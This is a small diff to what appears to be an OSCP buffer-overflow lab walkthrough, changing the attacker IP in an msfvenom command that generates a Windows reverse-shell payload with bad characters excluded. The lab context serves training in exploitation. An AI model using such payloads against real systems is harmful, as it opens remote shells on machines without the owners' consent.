@@ -401,7 +401,7 @@ Restart oscp.exe in Immunity and run the modified exploit.py script again. Your 
   * Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously
   
     ```
-    msfvenom -p windows/shell_reverse_tcp LHOST=10.17.127.233 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.17.127.223 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
     ```
 
     ![task2-msfvenom](./images/task2-msfvenom.png)
